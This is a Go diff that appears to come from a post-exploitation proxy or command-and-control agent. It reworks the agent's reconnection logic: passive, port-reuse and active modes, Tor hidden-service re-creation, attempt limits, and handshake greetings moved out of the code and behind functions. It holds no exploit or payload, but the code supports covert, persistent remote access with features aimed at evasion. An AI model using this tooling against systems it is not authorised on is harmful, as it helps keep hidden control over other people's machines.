@@ -20,12 +20,14 @@ import (
 func normalPassiveReconn(options *initial.Options) (net.Conn, []byte) {
 	listenAddr, _, err := utils.CheckIPPort(options.Listen)
 	if err != nil {
-		log.Fatalf("[*] Error occurred: %s", err.Error())
+		log.Printf("[*] Error occurred: %s\n", err.Error())
+		return nil, nil
 	}
 
 	listener, err := net.Listen("tcp", listenAddr)
 	if err != nil {
-		log.Fatalf("[*] Error occurred: %s", err.Error())
+		log.Printf("[*] Error occurred: %s\n", err.Error())
+		return nil, nil
 	}
 
 	defer func() {
@@ -35,8 +37,8 @@ func normalPassiveReconn(options *initial.Options) (net.Conn, []byte) {
 	var sMessage, rMessage protocol.Message
 
 	hiMess := &protocol.HIMess{
-		GreetingLen: uint16(len("Keep silent")),
-		Greeting:    "Keep silent",
+		GreetingLen: uint16(len(share.GreetAck())),
+		Greeting:    share.GreetAck(),
 		UUIDLen:     uint16(len(global.G_Component.UUID)),
 		UUID:        global.G_Component.UUID,
 		IsAdmin:     0,
@@ -51,7 +53,14 @@ func normalPassiveReconn(options *initial.Options) (net.Conn, []byte) {
 		Route:       protocol.TEMP_ROUTE,
 	}
 
+	const maxPassiveAttempts = 10000
+	attempts := 0
 	for {
+		attempts++
+		if attempts > maxPassiveAttempts {
+			log.Printf("[*] Max passive reconnection attempts (%d) exceeded, giving up", maxPassiveAttempts)
+			return nil, nil
+		}
 		conn, err := listener.Accept()
 		if err != nil {
 			log.Printf("[*] Error occurred: %s\n", err.Error())
@@ -90,7 +99,7 @@ func normalPassiveReconn(options *initial.Options) (net.Conn, []byte) {
 
 		if fHeader.MessageType == protocol.HI {
 			mmess := fMessage.(*protocol.HIMess)
-			if mmess.Greeting == "Shhh..." && mmess.IsAdmin == 1 {
+			if mmess.Greeting == share.GreetHello() && mmess.IsAdmin == 1 {
 				sMessage = protocol.NewUpMsg(conn, global.G_Component.CryptoKey, linkKey, protocol.TEMP_UUID)
 				protocol.ConstructMessage(sMessage, header, hiMess, false)
 				sMessage.SendMessage()
@@ -111,7 +120,8 @@ func soReusePassiveReconn(options *initial.Options) (net.Conn, []byte) {
 
 	listener, err := reuseport.Listen("tcp", listenAddr)
 	if err != nil {
-		log.Fatalf("[*] Error occurred: %s", err.Error())
+		log.Printf("[*] Error occurred: %s\n", err.Error())
+		return nil, nil
 	}
 
 	defer func() {
@@ -121,8 +131,8 @@ func soReusePassiveReconn(options *initial.Options) (net.Conn, []byte) {
 	var sMessage, rMessage protocol.Message
 
 	hiMess := &protocol.HIMess{
-		GreetingLen: uint16(len("Keep silent")),
-		Greeting:    "Keep silent",
+		GreetingLen: uint16(len(share.GreetAck())),
+		Greeting:    share.GreetAck(),
 		UUIDLen:     uint16(len(global.G_Component.UUID)),
 		UUID:        global.G_Component.UUID,
 		IsAdmin:     0,
@@ -137,7 +147,14 @@ func soReusePassiveReconn(options *initial.Options) (net.Conn, []byte) {
 		Route:       protocol.TEMP_ROUTE,
 	}
 
+	const maxPassiveAttempts = 10000
+	attempts := 0
 	for {
+		attempts++
+		if attempts > maxPassiveAttempts {
+			log.Printf("[*] Max passive reconnection attempts (%d) exceeded, giving up", maxPassiveAttempts)
+			return nil, nil
+		}
 		conn, err := listener.Accept()
 		if err != nil {
 			log.Printf("[*] Error occurred: %s\n", err.Error())
@@ -162,6 +179,7 @@ func soReusePassiveReconn(options *initial.Options) (net.Conn, []byte) {
 
 		linkKey, _, err := share.SoReuseAgentAuthAndExchange(conn, options.ReusePort, global.Session.AgentIdentity)
 		if err != nil {
+			conn.Close()
 			continue
 		}
 
@@ -175,7 +193,7 @@ func soReusePassiveReconn(options *initial.Options) (net.Conn, []byte) {
 
 		if fHeader.MessageType == protocol.HI {
 			mmess := fMessage.(*protocol.HIMess)
-			if mmess.Greeting == "Shhh..." && mmess.IsAdmin == 1 {
+			if mmess.Greeting == share.GreetHello() && mmess.IsAdmin == 1 {
 				sMessage = protocol.NewUpMsg(conn, global.G_Component.CryptoKey, linkKey, protocol.TEMP_UUID)
 				protocol.ConstructMessage(sMessage, header, hiMess, false)
 				sMessage.SendMessage()
@@ -191,8 +209,8 @@ func normalReconnActiveReconn(options *initial.Options, proxy share.Proxy) (net.
 	var sMessage, rMessage protocol.Message
 
 	hiMess := &protocol.HIMess{
-		GreetingLen: uint16(len("Shhh...")),
-		Greeting:    "Shhh...",
+		GreetingLen: uint16(len(share.GreetHello())),
+		Greeting:    share.GreetHello(),
 		UUIDLen:     uint16(len(global.G_Component.UUID)),
 		UUID:        global.G_Component.UUID,
 		IsAdmin:     0,
@@ -209,6 +227,7 @@ func normalReconnActiveReconn(options *initial.Options, proxy share.Proxy) (net.
 
 	base := time.Duration(options.Reconnect) * time.Second
 	attempt := 0
+	const maxReconnectAttempts = 10000
 
 	reconSleep := func(d time.Duration) {
 		if options.SleepMask {
@@ -219,6 +238,10 @@ func normalReconnActiveReconn(options *initial.Options, proxy share.Proxy) (net.
 	}
 
 	for {
+		if attempt >= maxReconnectAttempts {
+			log.Printf("[*] Max reconnection attempts (%d) exceeded, giving up", maxReconnectAttempts)
+			return nil, nil
+		}
 		var (
 			conn net.Conn
 			err  error
@@ -279,7 +302,7 @@ func normalReconnActiveReconn(options *initial.Options, proxy share.Proxy) (net.
 
 		if fHeader.MessageType == protocol.HI {
 			mmess := fMessage.(*protocol.HIMess)
-			if mmess.Greeting == "Keep silent" && mmess.IsAdmin == 1 {
+			if mmess.Greeting == share.GreetAck() && mmess.IsAdmin == 1 {
 				return conn, linkKey
 			}
 		}
@@ -293,7 +316,8 @@ func normalReconnActiveReconn(options *initial.Options, proxy share.Proxy) (net.
 func torHiddenPassiveReconn(options *initial.Options) (net.Conn, []byte) {
 	listener, err := net.Listen("tcp", "127.0.0.1:0")
 	if err != nil {
-		log.Fatalf("[*] Error occurred: %s", err.Error())
+		log.Printf("[*] Error occurred: %s\n", err.Error())
+		return nil, nil
 	}
 
 	localPort := listener.Addr().(*net.TCPAddr).Port
@@ -301,30 +325,34 @@ func torHiddenPassiveReconn(options *initial.Options) (net.Conn, []byte) {
 	tc := share.NewTorControl(options.TorControl, options.TorControlPW)
 	if err := tc.Connect(); err != nil {
 		listener.Close()
-		log.Fatalf("[*] Cannot reconnect Tor control: %s", err.Error())
+		log.Printf("[*] Cannot reconnect Tor control: %s\n", err.Error())
+		return nil, nil
 	}
 	if err := tc.Authenticate(); err != nil {
 		listener.Close()
 		tc.Close()
-		log.Fatalf("[*] Tor control auth failed: %s", err.Error())
+		log.Printf("[*] Tor control auth failed: %s\n", err.Error())
+		return nil, nil
 	}
 
 	onionAddr, err := tc.AddOnion(localPort, localPort)
 	if err != nil {
 		listener.Close()
 		tc.Close()
-		log.Fatalf("[*] Failed to recreate hidden service: %s", err.Error())
+		log.Printf("[*] Failed to recreate hidden service: %s\n", err.Error())
+		return nil, nil
 	}
 
 	log.Printf("[*] Tor hidden service re-established: %s:%d\n", onionAddr, localPort)
 
+	defer tc.Close()
 	defer listener.Close()
 
 	var sMessage, rMessage protocol.Message
 
 	hiMess := &protocol.HIMess{
-		GreetingLen: uint16(len("Keep silent")),
-		Greeting:    "Keep silent",
+		GreetingLen: uint16(len(share.GreetAck())),
+		Greeting:    share.GreetAck(),
 		UUIDLen:     uint16(len(global.G_Component.UUID)),
 		UUID:        global.G_Component.UUID,
 		IsAdmin:     0,
@@ -339,7 +367,14 @@ func torHiddenPassiveReconn(options *initial.Options) (net.Conn, []byte) {
 		Route:       protocol.TEMP_ROUTE,
 	}
 
+	const maxPassiveAttempts = 10000
+	attempts := 0
 	for {
+		attempts++
+		if attempts > maxPassiveAttempts {
+			log.Printf("[*] Max passive reconnection attempts (%d) exceeded, giving up", maxPassiveAttempts)
+			return nil, nil
+		}
 		conn, err := listener.Accept()
 		if err != nil {
 			log.Printf("[*] Error occurred: %s\n", err.Error())
@@ -367,7 +402,7 @@ func torHiddenPassiveReconn(options *initial.Options) (net.Conn, []byte) {
 
 		if fHeader.MessageType == protocol.HI {
 			mmess := fMessage.(*protocol.HIMess)
-			if mmess.Greeting == "Shhh..." && mmess.IsAdmin == 1 {
+			if mmess.Greeting == share.GreetHello() && mmess.IsAdmin == 1 {
 				sMessage = protocol.NewUpMsg(conn, global.G_Component.CryptoKey, linkKey, protocol.TEMP_UUID)
 				protocol.ConstructMessage(sMessage, header, hiMess, false)
 				sMessage.SendMessage()
